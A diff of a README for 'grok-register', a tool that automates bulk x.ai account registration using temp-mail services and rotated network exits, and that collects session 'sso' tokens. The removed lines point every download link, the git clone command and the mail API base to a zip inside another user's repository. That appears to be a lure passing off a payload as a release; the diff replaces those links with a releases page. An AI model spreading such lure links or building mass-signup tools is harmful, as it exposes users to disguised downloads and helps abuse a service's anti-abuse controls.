@@ -1,24 +1,24 @@
 # 🧩 grok-register - Run x.ai registration with ease
 
-[![Download grok-register](https://img.shields.io/badge/Download%20grok-register-4B6FFF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip)
+[![Download grok-register](https://img.shields.io/badge/Download%20grok-register-4B6FFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/509992828/grok-register/releases)
 
 ## 🚀 What this app does
 
-grok-register helps you run x.ai registration tasks from one place. It gives you a simple control panel, a task runner, network routing, and a token sink for grok2api.
+grok-register helps you run x.ai registration tasks from one place. It gives you a simple control panel, a task runner, network routing, and local account management.
 
 You can use it to:
 
 - run registration from the command line
 - create batch tasks in a web panel
-- set a separate exit route, email setup, and sink for each task
+- set a separate exit route and email setup for each task
 - watch rounds, success count, failure count, and logs in real time
-- send successful `sso` tokens into a `grok2api` compatible endpoint
+- manage successful accounts locally after registration
 
 ## 📥 Download grok-register
 
 Go to the release page here:
 
-[Download from GitHub Releases](https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip)
+[Download from GitHub Releases](https://github.com/509992828/grok-register/releases)
 
 On that page, get the latest build for Windows and save it to your PC.
 
@@ -61,12 +61,12 @@ You need these parts ready:
 
 - a working network route
 - a temp mail service that x.ai accepts
-- a sink that can receive tokens, such as `grok2api`
+- local account storage
 
 This app already includes:
 
 - `warp` as the default network exit
-- `grok2api` as the default token sink
+- a local account store in the console
 
 So you do not need to combine other repos for a basic setup.
 
@@ -80,7 +80,7 @@ In the control panel, set:
 
 For DuckMail, use this pattern:
 
-- `temp_mail_api_base`: `https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip`
+- `temp_mail_api_base`: `https://api.duckmail.sbs`
 - `temp_mail_admin_password`: leave blank for public use, or set your API key for a private domain
 - `temp_mail_domain`: leave blank to let the runner choose a public DuckMail domain
 
@@ -96,7 +96,7 @@ Set these values per task:
 
 - exit route
 - mail settings
-- sink target
+- account storage
 
 This gives you separate control for each run.
 
@@ -109,9 +109,9 @@ Watch each task as it runs. You can see:
 - failure count
 - log output
 
-### Token push
+### Account management
 
-When a registration succeeds, the app sends the `sso` token to the `grok2api` compatible sink.
+When a registration succeeds, the app stores the email, password, and `sso` locally for later management.
 
 ## 🧱 What to prepare on your PC
 
@@ -131,20 +131,25 @@ If you prefer a container setup, you can run the project with Docker too.
 ### Basic Docker flow
 
 ```bash
-git clone https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip
+git clone https://github.com/509992828/grok-register.git
 cd grok-register
 cp .env.example .env
 docker compose up -d --build
 ```
 
-If you need to change the external port or the `grok2api` admin password, edit `.env` first.
+GitHub Actions will build and publish the Docker image to GitHub Container Registry when code is pushed to `main` / `master`, when a `v*` tag is pushed, or when the workflow is run manually.
+
+Published image:
+
+- `ghcr.io/509992828/grok-register:latest`
+
+If you need to change the console port or default proxy, edit `.env` first.
 
 ### After startup
 
 Open these addresses in your browser:
 
 - `http://<your-server-ip>:18600`
-- `http://<your-server-ip>:8000/admin`
 
 ## 🔧 Common settings
 
@@ -168,9 +173,9 @@ The admin password or API key for your temp mail service.
 
 The mail domain used for registration.
 
-### `grok2api`
+### Local accounts
 
-The endpoint that receives the token after a successful run.
+Successful registrations are stored under task runtime data and shown in the console account manager.
 
 ## 📂 Typical file layout
 
@@ -188,12 +193,12 @@ Keep all files in the same folder so the app can find its settings.
 
 1. Open the app
 2. Open the web control panel
-3. Set your mail and sink details
+3. Set your mail details
 4. Choose the task settings
 5. Start the task
 6. Watch the log output
 7. Check the success count
-8. Confirm the token reached the sink
+8. Confirm the account appears in local account management
 
 ## 🔍 If the app does not start
 
@@ -221,15 +226,15 @@ If tasks fail during registration:
 - verify your temp mail domain
 - check the temp mail API base
 - make sure your network route is working
-- confirm the sink endpoint is correct
+- check that the runtime data directory is writable
 - review the log output for the exact step that failed
 
 ## 📝 Notes for safe use
 
-Use one clean folder for the app and its data. Keep the config file with the app. If you change the mail service or sink, update the settings before you start a new batch
+Use one clean folder for the app and its data. Keep the config file with the app. If you change the mail service, update the settings before you start a new batch
 
 ## 📦 Download again
 
 If you need the release page again, use this link:
 
-[Open the latest grok-register release](https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip)
+[Open the latest grok-register release](https://github.com/509992828/grok-register/releases)
